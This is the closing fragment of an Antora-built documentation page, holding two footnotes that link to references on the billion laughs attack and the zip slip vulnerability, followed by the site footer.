<a href="#_footnoteref_6">6</a>. <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" class="bare">https://en.wikipedia.org/wiki/Billion_laughs_attack</a>
</div>
<div class="footnote" id="_footnotedef_7">
<a href="#_footnoteref_7">7</a>. <a href="https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf" class="bare">https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf</a>
</div>
</div>
</article>
  </div>
</main>
</div>
<footer class="footer">
  <p>This page was built using the Antora default UI.</p>
  <p>The source code for this UI is licensed under the terms of the MPL-2.0 license.</p>
</footer>
<script id="site-script" src="../../../../_/js/site.js" data-ui-root-path="../../../../_"></script>
<script async src="../../../../_/js/vendor/highlight.js"></script>
  </body>
</html>
